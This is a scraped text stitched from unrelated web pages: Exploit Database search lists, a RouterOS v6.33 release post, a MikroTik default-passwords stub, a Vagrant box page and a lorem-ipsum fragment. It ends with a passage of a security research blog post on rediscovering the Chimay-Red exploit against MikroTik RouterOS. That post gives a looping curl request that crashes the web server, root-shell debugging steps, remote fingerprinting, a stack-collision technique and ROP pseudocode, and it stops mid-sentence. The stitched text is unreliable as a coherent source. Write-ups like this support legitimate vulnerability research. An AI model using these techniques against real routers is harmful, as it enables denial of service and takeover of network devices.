by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
After nearly a decade of hard work by the community, Johnny turned the GHDB
over to Offensive Security in November 2010, and it is now maintained as
an extension of the Exploit Database. Today, the GHDB includes searches for
other online search engines such as Bing,
and other online repositories like GitHub,
producing different, yet equally valuable results.
Close
Offensive Security Resources
×
Downloads
Certifications
Training
Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Offensive Security Wireless Attacks (WiFu)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Cracking the Perimeter (CTP)
Application Security Assessment
OSEE
Advanced Web Attacks (AWAE)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux training
Close
Search The Exploit Database
×
Title
CVE
Type
dos
local
remote
shellcode
papers
webapps
Platform
AIX
ASP
BSD
BSD_PPC
BSD_x86
BSDi_x86
CGI
FreeBSD
FreeBSD_x86
FreeBSD_x86-64
Generator
Hardware
HP-UX
IRIX
JSP
Linux
Linux_MIPS
Linux_PPC
Linux_SPARC
Linux_x86
Linux_x86-64
MINIX
Multiple
NetBSD_x86
Novell
OpenBSD
OpenBSD_x86
OSX_PPC
OSX
PHP
Plan9
QNX
SCO
SCO_x86
Solaris
Solaris_SPARC
Solaris_x86
Tru64
ULTRIX
Unix
UnixWare
Windows_x86
Windows_x86-64
Windows
ARM
CFM
Netware
SuperH_SH4
Java
BeOS
Immunix
Palm_OS
AtheOS
iOS
Android
XML
Perl
Python
System_z
JSON
ASHX
Ruby
ASPX
macOS
Linux_CRISv32
eZine
Magazine
NodeJS
Alpha
Solaris_MIPS
Lua
Author
Content
Port
14
21
22
23
25
42
49
53
66
69
70
79
80
81
102
105
110
111
113
119
123
135
139
143
161
162
164
383
389
402
406
411
443
444
445
446
502
504
513
514
515
532
548
554
555
617
623
631
655
689
783
787
808
873
888
901
998
1000
1040
1089
1099
1100
1114
1120
1194
1235
1471
1521
1533
1581
1589
1604
1617
1723
1743
1761
1812
1858
1861
1900
1947
2000
2022
2049
2100
2103
2121
2125
2181
2242
2315
2375
2380
2381
2401
2480
2525
2640
2810
2812
2947
2954
2990
3000
3030
3050
3052
3128
3129
3181
3200
3217
3306
3333
3378
3460
3465
3500
3535
3632
3690
3790
3814
3817
4000
4002
4070
4081
4105
4111
4322
4343
4434
4501
4555
4592
4661
4750
4848
5000
5060
5061
5080
5081
5093
5151
5180
5247
5250
5272
5308
5432
5466
5554
5555
5600
5655
5666
5800
5803
5814
5858
5900
5984
6066
6070
6080
6082
6101
6112
6129
6502
6503
6660
6667
7001
7002
7070
7071
7080
7100
7144
7210
7272
7290
7426
7443
7510
7547
7649
7770
7777
7778
7787
7879
7902
8000
8001
8002
8004
8008
8020
8022
8023
8028
8030
8080
8081
8082
8088
8090
8181
8300
8400
8443
8445
8473
8500
8585
8619
8800
8812
8839
8880
8888
9000
9001
9002
9080
9090
9091
9100
9124
9200
9251
9256
9443
9447
9784
9788
9855
9876
9900
9987
9993
9999
10000
10001
10080
10202
10203
10443
10616
11000
11211
11460
12203
12221
12345
12397
12401
13327
13701
13722
13838
16992
18821
18881
19000
19810
19813
20000
20010
20031
20111
20171
22003
23423
25672
26000
27015
27700
28015
30000
30303
31337
32400
32674
32764
34205
37215
37777
37848
38292
40007
41523
44334
46824
48080
49152
50000
50496
52311
52789
52869
52986
53413
54345
54890
55554
55555
56380
57772
58080
62514
Tag
WordPress Core
Metasploit Framework (MSF)
WordPress Plugin
SQL Injection (SQLi)
Cross-Site Scripting (XSS)
File Inclusion (LFI/RFI)
Cross-Site Request Forgery (CSRF)
Denial of Service (DoS)
Code Injection
Command Injection
Authentication Bypass / Credentials Bypass (AB/CB)
Client Side
Use After Free (UAF)
Out Of Bounds
Remote
Local
XML External Entity (XXE)
Integer Overflow
Server-Side Request Forgery (SSRF)
Race Condition
NULL Pointer Dereference
Malware
Buffer Overflow
Heap Overflow
Type Confusion
Object Injection
Bug Report
Console
Pwn2Own
Traversal
Deserialization
Verified
Has App
No Metasploit
SearchSOCIFI Documentation
Confluence Home
{"serverDuration": 34, "requestCorrelationId": "0065f15098ea5a96"}MikroTik has released RouterOS v6.33
MikroTik has released RouterOS v6.33
Blog
Success Stories
New Products
Product News
Technical Discussions
Our Videos on YouTube
Press Releases
News Security SA
Catalogue
LOGIN
0 Items
MenuHomeProducts
Wi-Fi
Broadband Wireless
Carrier Wireless
Antennas & Masts
Power & Surge
Networking
Cabling & Cabinets
Telephony
Surveillance
Access Control
IoT
Cambium NetworksIndoor Wi-FiOutdoor Wi-FiEdimaxIndoor Wi-FiOutdoor Wi-FiADSLClient AdapterManagementEngeniusIndoor Wi-FiOutdoor Wi-FiManagementGrandstreamIndoor Wi-FiOutdoor Wi-FiManagementHuawei3G / LTELigowaveIndoor Wi-FiOutdoor Wi-FiMikroTikIndoor Wi-FiOutdoor Wi-Fi3G / LTEHomePlugTendaIndoor Wi-FiADSL3G / LTEClient AdapterHomePlugOpen-MeshIndoor Wi-FiOutdoor Wi-FiTP-LinkIndoor Wi-FiOutdoor Wi-FiADSL3G / LTEClient AdapterHomePlugUbiquiti NetworksIndoor Wi-FiOutdoor Wi-FiAirmaxManagement
Cambium Networks5.8GHz ePMPUpgrade LicensesAccessoriesMini-PCI & Mini-PCI Express Cards3G / LTEWeatherproof EnclosuresWeatherproof EnclosuresAccessoriesLigowaveiPoll 2.4Ghz RadiosiPoll 5Ghz RadiosAccessoriesMimosa5GHz Backhaul RadioPTMP Access PointsPTMP Client RadioMikroTik2.4GHzRouterBOARDDual BandWireless Systems3G / LTELTE CPE60GHzRouterOS LicensesAccessoriesUbiquiti NetworksEdgePointAirMax 2.4GHz RadiosAirGatewayAirMax 5GHz RadiosCRM PointInstallation accessoriesTrainingOnline Training
2.4 GHzUbiquiti AirFiber3.5 GHzRadwin 2000 - PTPRadwin 5000 - PTMPUbiquiti AirMaxRadwin AccessoriesUbiquiti AirFiber5GHz License ExemptCambium PTPCambium PMPLigowave PTP BackhaulLigowave PTMP CarrierRadwin 2000 - PTPRadwin 2000 Upgrade LicensesRadwin 5000 - PTMPRadwin 5000 Upgrade LicensesRadwin IDURadwin AccessoriesUbiquiti AirFiber6.0 GHzRadwin 2000 - PTPRadwin 5000 - PTMPRadwin Accessories7 GHz to 42 GHzNEC Outdoor Radio UnitsNEC Outdoor Modem UnitsNEC Integrated Microwave AntennaeNEC AccessoriesNEC LicensesNEC Complete Links Kits10 GHzUbiquiti AirMax11GHzMimosa Backhaul RadioUbiquiti AirFiber17GHz License-ExemptSIAE AlfoPlus Radio LinkSIAE Upgrade LicensesSIAE Parabolic Dish AntennasSIAE Utilities24GHzUbiquiti AirFiber60 GHz (V-Band)Siklu V-BandIgniteNet80 GHz (E-Band)Siklu E-Band
2.4 GHzDipoleOmni DirectionalSectorised MIMOFlat PanelGridParabolic Dish MIMOGSM / 3G / LTEYagiFlat Panel5 GHzOmni DirectionalSectorised SISOMounting AccessoriesSectorised MIMOSpecialised MIMOFlat PanelSymmetrical horn SectorsGridParabolic Dish MIMO10 GHzMimosa B11Ubiquiti AirMaxAccessoriesGridTwistPort ConnectorsShield KitsMounting AccessoriesRadomesLattice MastsLattice MastsMast AccessoriesAluminium Poles & BracketsUtilitiesAluminium PolesWall Brackets
PoE & Power SuppliesPoE - Active ACPoE - Passive DCPoE Converters & ExtendersPower SuppliesPoE TestersUPS & SolarSolar PanelsSolar Charge ControllersPoE Converters & ExtendersSolar AccessoriesBatteriesDC to DC ConvertersUPSUtilitiesSurge ProtectionSurge ArrestorsEthernet Gigabit PoEUtilitiesAccessoriesPower CordsMimosaSurge ArrestorsControl & AutomationSMS Alerts & Control
Switches - UnmanagedUnmanaged10/100 DesktopWebsmartGigabit DesktopGigabit RackmountSwitches - ManagedCloud ManagedWebsmartLayer 2Layer 3DatacentreSwitches - PoEUnmanagedCloud ManagedWebsmartLayer 2Layer 3DC PoweredRoutersIndoor Wi-FiUbiquiti EdgeRouterMikroTikAccessoriesPCI Express CardsUSB AdaptersKVM SwitchesFibreEPONGPONCWDMFibre CableSFP ModulesEthernet Media ConvertersControl & AutomationUbiquiti mFiTendaUnmanagedManagementSurveillance SwitchesUniviewVivotekLayer 2TP-LinkUnmanagedWebsmartGigabit DesktopAccessoriesStorageHard Drives
Coax Cable & ConnectorsRF CableRF ConnectorsCrimping ToolsPigtailsCable AssembliesInter-Series Adapters (Jacks)LAN Cable & ConnectorsIndoor CableOutdoor CableFlyleadsToolsUtilitiesCabinets & RacksOutdoor CabinetsServer RacksWall BoxesAccessoriesFibreFibre Patch LeadsFibre Cable
Access ControlDoorphone (Intercom)IP PABXGrandstreamSwitchvoxSwitchvox Appliance LicencesSwitchvox Gold LicensesSwitchvox Platinum LicenseSwitchvox Titanium LicenseDigium licencesGrandstreamTagsUSB DongleSIP Phones - 2 LineDoorphone (Intercom)VoIP PhonesSIP Phones - 1 LineSIP Phones - 2 LineSIP Phones - 3 LineSIP Phones - 4 LineSIP Phones - 6+ LineDECT PhonesConference PhonesVideo PhonesDoorphone (Intercom)HeadsetsMonaural HeadsetsBinaural HeadsetsVideo ConferencingVideo Conference SystemsIPVideoTalk LicenseGatewaysFXS GatewaysFXO GatewaysPRI GatewaysATAsUtilitiesAnalogue PhonesLong RangeDECT PhonesAnalogue Interface CardsDigium 24 Port PCI CardsHybrid Interface CardsDigium 8 Port PCI CardsUtilitiesDigital Interface CardsPRI - 60 ChannelUtilitiesTrainingOnline Training
IP CamerasFixed CameraBullet CameraDome CameraFish EyePan / Tilt (Zoom) CameraPan Tilt CameraRing Home SecurityWireless Video DoorbellFixed CameraAccessoriesSwitches - PoEUniviewVideo ServersAnalogue to IPAccessoriesCamera LensesKeyboard & JoystickInfrared IlluminatorsMounting AccessoriesAccessoriesNetwork Video RecordersUniviewVivotekNUUOGrandstreamUbiquiti airVisionSurveillance SwitchesUniviewStorageHard DrivesTrainingOnline Training
Access ControlZKTecoAxxess-EBiometricsZKTecoAccessoriesTagsPower CordsZKTecoDoor Accessories
TeltonikaIndustrial 3G/LTEAutomotive LTETeltonika AccessoriesUbiquiti NetworksPoE Lighting
CloseTraining & EventsLatest NewsSuccess StoriesOur Videos On YoutubeMiro Events GalleryPress ReleasesHi-Tech Security Articles – What’s NEW at MiRO! CloseOur BrandsAbout MiROAbout MiROOur ServicesEmployment @ MiROMiRO BEEBanking DetailsCatalogue CloseSign UpBecome a Business PartnerBenefits of Signing Up CloseContact Us
Select Page
Looking for?
Products
Posts
Home / Mikrotik / MikroTik RouterOS v6.33 released
MikroTik RouterOS v6.33 released
by Herman Conradie | Nov 10, 2015 | Mikrotik, Product News | 0 comments
MikroTik has released RouterOS v6.33
The new RouterOS v6.33 has been released, with the most detailed Changelog MikroTik have ever made. With this MikroTik have also replaced 6.30.4 with 6.32.3 as the “bugfix only” version in MikroTik’s new release system. You can still use v6.30.4 as it has no known issues, but 6.32.3 has been tested long enough that MikroTik are certain it is stable enough to promote it to “bugfix” status. Next updates for this version will only include minor fixes.
Some of v6.33 highlights:
Single stream TCP improvements
Fasttrack support for eoip,gre,ipip tunnels
Implemented PPPoE over L2TP in LNS mode, RFC3817
Auto-upgrade – added ability to select which versions to select when upgrading
Together with RouterOS v6.33 MikroTik have also released the full WinBox 3. New features include separation of all files from RouterOS (WinBox is now portable), grouping of saved routers, RoMON support for multi hop router discovery, proper saving of layout, moving of layout preferences and much more.
RouterOS v6.33 Download
Click here to view some of the MikroTik routers Miro stocks.
If you enjoyed reading this, don't forget to share it:
Share on FacebookShare on TwitterShare on Linkedin
Submit a Comment Cancel reply
Your email address will not be published. Required fields are marked *Comment Name *
Email *
Website
Search
Search for:
Search Blog PostsSearch Products
Provide your contact details and one of our sales team will be in touch
Your Name (required)
Please leave this field empty.
Your Email (required)
Subject
Your Message
© 2019 - MiRO distribution
LOGIN
Disclaimer
T’s & C’s
Privacy & Security
Site Map
Sign up to our newsletter here
Youtube
Instagram
Facebook
Twitter
LinkedIn
RSS
nunc id id consectetur Sed Donec dapibus facilisis ipsum risus amet,
Performing search based on your search criteria.Mikrotik default passwords
DefaultPassword
Help us! Add your device!
Search
Home
Mikrotik
Mikrotik devices
Mikrotik
1 password
Router OS - 2.9.17
1 password
Router OS - all
1 password
routerboard 750
1 password
© Analogic s.r.o. 2019 | Privacy policyVagrant box foonicorn/mikrotik-stable v6.44 -
Vagrant Cloud
Search
Pricing
Vagrant
Help
Create an Account
Sign In
foonicorn/mikrotik-stable
Vagrant box
How to use this box with Vagrant:
Vagrantfile
New
Vagrant.configure("2") do |config|
config.vm.box = "foonicorn/mikrotik-stable"
config.vm.box_version = "6.44"
end
vagrant init foonicorn/mikrotik-stable \
--box-version 6.44
vagrant up
v6.44
currently released version
This version was created
4 months ago.
current Stable RouterOS CHR Version 6.44
1 provider for this version.
virtualbox
Hosted by Vagrant Cloud
(31.3 MB)
Homepage
Terms
Privacy
Security
API
© 2019Chimay-Red
Seekintoo: blog
seekintoo.com
arcsight
careers
ctf
research
Chimay-Red
Sat 28 April 2018
By
Dayton
This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
Brief History and Background
MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
RouterBOARD 850gx3
Plausible causes of interest (speculation)
Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
shodan.io device map: 1 == 1000 devices
In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
Vault 7
Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
Chimay-Red
Background
Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
V2.9 (07/01/2015)
• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
• Adds support for MikroTik 6.x.
Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
Exploit Usage:
Operator usage Python traceback screenshot:
Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
Chimay-Red (my turn)
Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
MK 6.38.5 release notes - link
Initial Goals
I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
The replica exploit will:
At minimum, conform to the operators usage guide.
Support the same architectures and commands.
Note: Specific supported 6.x versions are unknown via the leaks.
The replica exploit should:
Support all 6.x versions and architectures
Tooling for enumerating, downloading, analyzing and cataloging system firmware
Needed for building ROP-chains and store metadata for approx ~200 different FW versions
Containerize and optionally emulate any system firmware for fuzzing and testing.
On The Hunt
Extracting FW images:
Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
4096
0x1000
Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
Webserver Binary Location:
$ find $firmware-images.extracted/squashfs-root -name "www" -type f
firmware-images.extracted/squashfs-root/nova/bin/www
$ file $firmware-images.extracted/squashfs-root/nova/bin/www
www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
WWW Reverse Engineering Notes
Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
One thread per socket connection.
Each connection is allocated 128KiB (0x20000) of stack space per thread
This is set by pthread_attr_setstacksize in main()
Each thread stack space is allocated ontop on the previous thread.
|
|
^-------------^ < Thread2 ESP
|
|
|
|
|
Thread1
|
|
|
^-------------^ < Thread1 ESP
|
|
|
|
|
Thread0
|
|
|
^-------------^ < Thread0 ESP
Automatically restarted on crash after three seconds
The loader arbiter (/nova/bin/loader) controls this via signal handling and PID tracking.
ELF Mitigations:
Architecture
NX
CANARY
PIE
RELRO
x86
YES
NO
NO
NO
ARM
YES
NO
NO
NO
POWERPC
YES
NO
NO
NO
SMIPS
NO
NO
NO
NO
MMIPS
NO
NO
NO
NO
MIPSBE
NO
NO
NO
NO
TILE
NO
NO
NO
NO
Analyzing the difference with IDA and BinDiff
By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
Note: A good BinDiff trick is to look for lowest similarity with high confidence
6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
int header;
int recv_len;
int *alloca_sp
int content_length_value = 0;
char *content_length;
// Block until request received
recv_len = sock::recv(32768);
// Set the name of the header we are looking for
string::string(&content_length, "content_length");
// Grab given header_name given the raw request.
header = Headers::getHeader(&content_length, &content_length_value);
if (!header) {
goto exit;
} else if (recv_len == 0) {
goto exit;
} else if (recv_len < content_length_value) {
goto exit;
}
// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
// This call is optimized to "sub eax, esp" with most compilers.
alloca_sp = alloca(content_length_value);
// Read content_length_value bytes from socket and write
// into newly likely improperly allocated stack space. (SIGSEGV)
istream::read(alloca_sp, content_length_value)
So what's the vulnerability?
Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
alloca() in-lined assembly snippet from readPostData():
8055a56:
8d 42 10
lea
eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
8055a59:
83 e0 f0
and
eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
8055a5c:
29 c4
sub
esp,eax
<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
Example alloca() alignment in Python:
>>> content_length_value = -1
>>> (content_length_value - 0x10) & 0xFFFFFFF0
4294967264
As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
Identifying a POST method URL endpoint on the webserver:
To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
PoC ()
At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
CURL PoC:
while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
ASCIInema PoC demo:
As you can see, the webserver crashes and is automatically restarted every three seconds.
Building the Exploit
For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
pwntools
MIPSROP
GDB
GDB PEDA
GEF
Binutils Collection
Getting a debugger on the target
I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
Mount both partitions from RouterOS Virtual Disk
$ mount /dev/sda1 /mnt/disk1
$ mount /dev/sda2 /mnt/disk2
Create a file called devel-login in /dev/disk2/etc/
$ touch /dev/disk2/etc/devel-login
Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
$ cp ./gdbserver /mnt/disk/flash/bin
Connect over telnet to target and login as devel-login, blank password:
MikroTik 6.38.4 (stable)
MikroTik Login: devel-login
Password:
BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
#
Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
You can now do remote debugging with GDB:
$ gdb -q
gdb-peda$ target remote 192.168.56.124:4444
Exploit Building Preconditions and Requirements
To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
Detecting architecture remotely
Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
MNDP
The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
by enabling each MikroTik router to discover other connected MikroTik routers and learn
information about the system along with features which are enabled. The MikroTik routers
can automatically use learned information to set up some features with minimal or no configuration.
MNDP features:
works on IP level connections
works on all non-dynamic interfaces
distributes basic information on the software version
distributes information on configured features that should interoperate with other MikroTik routers
The type of information usually associated with MNDP packets are:
age
address
identity
interface(s)
mac-address
platform
software-id
unpack version
uptime,
hardware info
To take use of MNDP for detecting the target architecture, its usage is simplified as so:
Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
Wait a little while.
Receive information back on 0.0.0.0:5678.
Detecting version remotely
Detecting the remote version is simple for majority of the exposed services.
Here's a few:
HTTP
Version string in HTML GET request data from maintenance webpage
FTP
Version string in banner
220 MikroTik FTP server (MikroTik 6.38.4) ready
TELNET
Version string in banner
MikroTik v6.38.4 (stable)
MNDP
Version string in version entry within MNDP packet.
The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
Abusing alloca(); a multithreaded tango
man 3 alloca:
void *alloca(size_t size)
...
The
alloca() function allocates size bytes of space in the stack frame of the caller.
If the allocation causes stack overflow, program behavior is undefined.
The procedure is as follows:
Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
Note: Gray represents the space already taken up on the stack for existing data.
Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
return address overwrite calculation eg:
ADDR_SIZE = 8
SAFE_SPACE = 0x1000
THREAD_STACK_SIZE = 0x20000
PAYLOAD_LEN = len(payload) # 0x8000
>>> hex(((THREAD_STACK_SIZE + SAFE_SPACE + PAYLOAD_LEN) - PAYLOAD_LEN) - ((SAFE_SPACE - 0x10) & 0xFFFFFFF0) - ADDR_SIZE)
'0x20008'
ROP
Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.
Psuedocode for technique to execute: ls -la
system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
#
("s", "y", "s", "t", "e", "m", "\x00")
cmd_chunks = [134512885, 134512899, 134512682, 134512891, 134512885, 134516284, 134512693]
#
("l", "s", " ", "-", "l", "a", "\x00")
writable_segment_addr = 134514680
jmp_eax = 134514248
char_size = 1
command = bytes()
char_pointer = 0
for address in system_chunks:
command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
char_pointer += 1
system = bytes()
char_pointer = 0
for address in cmd_chunks:
system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
char_pointer += 1
|<<<< rop.call(<dlsym>, args=(0, system))
|
|
Note: [EAX] = resultant pointer of dlsym() call
|
|>>>> rop.call(jmp_eax, args=(command,))
What it do?
First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
